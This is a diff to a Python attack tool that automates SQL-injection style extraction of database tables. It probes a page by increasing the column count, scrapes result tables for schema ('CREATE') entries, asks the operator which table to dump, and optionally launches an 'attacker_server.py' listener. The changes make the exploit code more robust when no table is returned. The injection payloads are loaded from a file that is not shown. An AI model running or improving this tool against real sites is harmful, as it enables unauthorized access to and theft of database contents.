@@ -53,8 +53,12 @@ def table_data(col_str, table_enum, table_name, session, payload, page):
 	data = []
 	html = BeautifulSoup(resp.content, 'html.parser')
 	table = html.find('table')
-	table_body = table.find('tbody')
-	rows = table_body.find_all('tr')
+
+	if not table:
+		print("Unsuccessful run! Are you sure this page contains a table to exploit?")
+		return -1, -1
+
+	rows = table.find_all('tr')
 	for row in rows:
 	    cols = row.find_all('td')
 	    cols = [ele.text.strip() for ele in cols]
@@ -101,11 +105,12 @@ def table_enumeration(gen_payload, session, page):
 		else:
 			resp = controller.post(page.url, data=data)
 
-
 		if "Error" in resp.text or "error" in resp.text:
 			column_count += 1
 		else:
 			bad_result = False
+
+	#print(resp.text)
 
 	print()
 	if bad_result:
@@ -116,9 +121,15 @@ def table_enumeration(gen_payload, session, page):
 
 	data = []
 	html = BeautifulSoup(resp.content, 'html.parser')
-	table = html.find('table')
-	table_body = table.find('tbody')
-	rows = table_body.find_all('tr')
+	tables = html.find_all('table')
+	if not tables:
+		print("Unsuccessful run! Are you sure this page contains a table to exploit?")
+		return -1, -1
+	for table in tables:
+		if 'CREATE' in str(table):
+			print(table)
+			break
+	rows = table.find_all('tr')
 	for row in rows:
 	    cols = row.find_all('td')
 	    cols = [ele.text.strip() for ele in cols]
@@ -187,11 +198,12 @@ def fix_payload(vuln_type, process, exploit, session, page, add_info=None):
 			return [-1]
 		if exploit["name"] == "exploit_3":
 			col_str, table_enum = table_enumeration(exploit["payload_def"], session, page)
+			if col_str == -1 and table_enum == -1:
+				return[-1]
 			table_name = input("Enter the name of table you would like to see (case-sensitive): ")
 			table_data(col_str, table_enum, table_name,session, exploit["payload"], page)
 			print()
 			return[-1]
-
 
 def hack(login, vulnerabilities, session=None):
 	with open("exploits.json", 'r') as in_file:
@@ -202,7 +214,7 @@ def hack(login, vulnerabilities, session=None):
 		answer = input("Invalid input. Please enter either Y/n or N/n: ")
 	if answer == 'Y' or answer == 'y':
 		#, stdout=subprocess.STDOUT, stderr=subprocess.STDOUT
-		process = subprocess.Popen(['python3', 'attacker_server.py'])
+		process = subprocess.Popen(['python3', 'attacker_server.py'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 	else:
 		process = None
 
